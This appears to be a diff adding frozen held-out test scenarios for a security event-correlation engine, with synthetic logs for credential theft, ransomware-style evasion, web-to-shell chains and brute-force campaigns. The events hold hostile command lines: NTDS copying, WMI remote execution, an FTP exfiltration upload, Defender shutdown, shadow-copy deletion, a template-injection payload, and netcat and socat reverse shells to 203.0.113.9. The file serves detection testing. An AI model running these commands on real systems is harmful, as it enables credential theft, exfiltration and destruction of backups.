@@ -1,0 +1,671 @@
+# FROZEN held-out campaigns v3. Written without consulting correlations.yaml. Do not edit (see validation/FROZEN.json).
+scenarios:
+- id: HC3-001
+  name: NTDS theft followed by WMI remote execution (same service account)
+  expect_correlation: TB-COR-004
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: dc-02
+    process_name: esentutl.exe
+    command_line: esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\n.dit
+    username: svc-sql
+  - at: 90
+    title: Process creation
+    event_type: process.start
+    asset_name: dc-02
+    process_name: wmic.exe
+    command_line: wmic /node:10.0.4.12 process call create "cmd /c C:\Windows\Temp\p.exe"
+    username: svc-sql
+- id: HC3-002
+  name: Archive then FTP upload on one workstation
+  expect_correlation: TB-COR-005
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: ws-hr-09
+    process_name: 7z.exe
+    command_line: 7z.exe a -tzip -pX C:\Users\Public\hr.zip C:\Users\*\Documents\*.xlsx
+  - at: 75
+    title: Process creation
+    event_type: process.start
+    asset_name: ws-hr-09
+    process_name: curl.exe
+    command_line: curl.exe -T C:\Users\Public\hr.zip ftp://203.0.113.20/in/ --user u:p
+- id: HC3-003
+  name: Defender stopped then shadow copies deleted via WMI
+  expect_correlation: TB-COR-006
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-03
+    process_name: powershell.exe
+    command_line: powershell Stop-Service -Name WinDefend -Force
+  - at: 20
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-03
+    process_name: wmic.exe
+    command_line: wmic shadowcopy delete /nointeractive
+- id: HC3-004
+  name: Template injection then netcat shell on the web host
+  expect_correlation: TB-COR-003
+  events:
+  - at: 0
+    title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.150
+    asset_name: web-09
+    raw_data:
+      url: /greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+  - at: 6
+    title: Process creation
+    event_type: process.start
+    asset_name: web-09
+    process_name: nc.traditional
+    command_line: nc.traditional -e /bin/bash 203.0.113.9 4444
+- id: HC3-005
+  name: Three different attack phases on one server within two hours
+  expect_correlation: TB-COR-007
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: app-09
+    process_name: nc.traditional
+    command_line: nc.traditional -e /bin/bash 203.0.113.9 4444
+  - at: 30
+    title: Process creation
+    event_type: process.start
+    asset_name: app-09
+    process_name: bash
+    command_line: (crontab -l; echo '@reboot /tmp/.x') | crontab -
+  - at: 60
+    title: Process creation
+    event_type: process.start
+    asset_name: app-09
+    process_name: cat
+    command_line: cat /root/.aws/credentials
+- id: HC3-006
+  name: Distributed brute force against one account from seven addresses
+  expect_correlation: TB-COR-016
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.100
+    username: ceo
+    asset_name: vpn-02
+  - at: 5
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.101
+    username: ceo
+    asset_name: vpn-02
+  - at: 10
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.102
+    username: ceo
+    asset_name: vpn-02
+  - at: 15
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.103
+    username: ceo
+    asset_name: vpn-02
+  - at: 20
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.104
+    username: ceo
+    asset_name: vpn-02
+  - at: 25
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.105
+    username: ceo
+    asset_name: vpn-02
+  - at: 30
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.106
+    username: ceo
+    asset_name: vpn-02
+- id: HC3-007
+  name: 'Low-and-slow brute force: sixteen failures against one account over a day'
+  expect_correlation: TB-COR-015
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 80
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 160
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 240
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 320
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 400
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 480
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 560
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 640
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 720
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 800
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 880
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 960
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1040
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1120
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1200
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.71
+    username: svc-batch
+    asset_name: vpn-02
+- id: HC3-008
+  name: Slow password spray across twenty-two accounts over twelve hours
+  expect_correlation: TB-COR-017
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp00
+    asset_name: vpn-02
+  - at: 30
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp01
+    asset_name: vpn-02
+  - at: 60
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp02
+    asset_name: vpn-02
+  - at: 90
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp03
+    asset_name: vpn-02
+  - at: 120
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp04
+    asset_name: vpn-02
+  - at: 150
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp05
+    asset_name: vpn-02
+  - at: 180
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp06
+    asset_name: vpn-02
+  - at: 210
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp07
+    asset_name: vpn-02
+  - at: 240
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp08
+    asset_name: vpn-02
+  - at: 270
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp09
+    asset_name: vpn-02
+  - at: 300
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp10
+    asset_name: vpn-02
+  - at: 330
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp11
+    asset_name: vpn-02
+  - at: 360
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp12
+    asset_name: vpn-02
+  - at: 390
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp13
+    asset_name: vpn-02
+  - at: 420
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp14
+    asset_name: vpn-02
+  - at: 450
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp15
+    asset_name: vpn-02
+  - at: 480
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp16
+    asset_name: vpn-02
+  - at: 510
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp17
+    asset_name: vpn-02
+  - at: 540
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp18
+    asset_name: vpn-02
+  - at: 570
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp19
+    asset_name: vpn-02
+  - at: 600
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp20
+    asset_name: vpn-02
+  - at: 630
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.72
+    username: emp21
+    asset_name: vpn-02
+- id: HC3-009
+  name: Chain events delivered out of order (last stage first)
+  expect_correlation: TB-COR-006
+  events:
+  - at: 20
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-04
+    process_name: wmic.exe
+    command_line: wmic shadowcopy delete /nointeractive
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-04
+    process_name: powershell.exe
+    command_line: powershell Stop-Service -Name WinDefend -Force
+- id: HC3-010
+  name: Same account spelled three ways across a credential-theft chain
+  expect_correlation: TB-COR-004
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: dc-02
+    process_name: esentutl.exe
+    command_line: esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\n.dit
+    username: CORP\SVC-Sql
+  - at: 60
+    title: Process creation
+    event_type: process.start
+    asset_name: dc-02
+    process_name: wmic.exe
+    command_line: wmic /node:10.0.4.12 process call create "cmd /c C:\Windows\Temp\p.exe"
+    username: svc-sql
+- id: HC3-011
+  name: Same server spelled as FQDN and short name across a web-to-shell chain
+  expect_correlation: TB-COR-003
+  events:
+  - at: 0
+    title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.151
+    asset_name: WEB-09.corp.local
+    raw_data:
+      url: /greet?name={{7*7}}
+      user_agent: x
+  - at: 4
+    title: Process creation
+    event_type: process.start
+    asset_name: web-09
+    process_name: socat
+    command_line: socat TCP:203.0.113.9:4444 EXEC:/bin/bash
+- id: HC3-N01
+  name: Slow brute force below the burst threshold (sixteen failures over a day) must not look like a ten-minute burst
+  forbid_correlation: TB-COR-013
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 80
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 160
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 240
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 320
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 400
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 480
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 560
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 640
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 720
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 800
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 880
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 960
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1040
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1120
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+  - at: 1200
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.73
+    username: svc-batch
+    asset_name: vpn-02
+- id: HC3-N02
+  name: Wipe tooling stopped on one host, impact on another
+  forbid_correlation: TB-COR-006
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-05
+    process_name: powershell.exe
+    command_line: powershell Stop-Service -Name WinDefend -Force
+  - at: 20
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-99
+    process_name: wmic.exe
+    command_line: wmic shadowcopy delete /nointeractive
+- id: HC3-N03
+  name: Impact first then evasion (wrong order)
+  forbid_correlation: TB-COR-006
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-06
+    process_name: wmic.exe
+    command_line: wmic shadowcopy delete /nointeractive
+  - at: 20
+    title: Process creation
+    event_type: process.start
+    asset_name: srv-fs-06
+    process_name: powershell.exe
+    command_line: powershell Stop-Service -Name WinDefend -Force
+- id: HC3-N04
+  name: Three phases spread over three servers
+  forbid_correlation: TB-COR-007
+  events:
+  - at: 0
+    title: Process creation
+    event_type: process.start
+    asset_name: app-91
+    process_name: nc.traditional
+    command_line: nc.traditional -e /bin/bash 203.0.113.9 4444
+  - at: 30
+    title: Process creation
+    event_type: process.start
+    asset_name: app-92
+    process_name: bash
+    command_line: (crontab -l; echo '@reboot /tmp/.x') | crontab -
+  - at: 60
+    title: Process creation
+    event_type: process.start
+    asset_name: app-93
+    process_name: cat
+    command_line: cat /root/.aws/credentials
+- id: HC3-N05
+  name: Failures from seven addresses against seven different accounts is not single-account brute force
+  forbid_correlation: TB-COR-016
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.110
+    username: user0
+    asset_name: vpn-02
+  - at: 5
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.111
+    username: user1
+    asset_name: vpn-02
+  - at: 10
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.112
+    username: user2
+    asset_name: vpn-02
+  - at: 15
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.113
+    username: user3
+    asset_name: vpn-02
+  - at: 20
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.114
+    username: user4
+    asset_name: vpn-02
+  - at: 25
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.115
+    username: user5
+    asset_name: vpn-02
+  - at: 30
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.116
+    username: user6
+    asset_name: vpn-02
+- id: HC3-N06
+  name: Same seven addresses, failures spread over a day (not distributed brute force)
+  forbid_correlation: TB-COR-016
+  events:
+  - at: 0
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.120
+    username: ceo
+    asset_name: vpn-02
+  - at: 200
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.121
+    username: ceo
+    asset_name: vpn-02
+  - at: 400
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.122
+    username: ceo
+    asset_name: vpn-02
+  - at: 600
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.123
+    username: ceo
+    asset_name: vpn-02
+  - at: 800
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.124
+    username: ceo
+    asset_name: vpn-02
+  - at: 1000
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.125
+    username: ceo
+    asset_name: vpn-02
+  - at: 1200
+    title: Failed logon
+    event_type: authentication.failed
+    source_ip: 203.0.113.126
+    username: ceo
+    asset_name: vpn-02
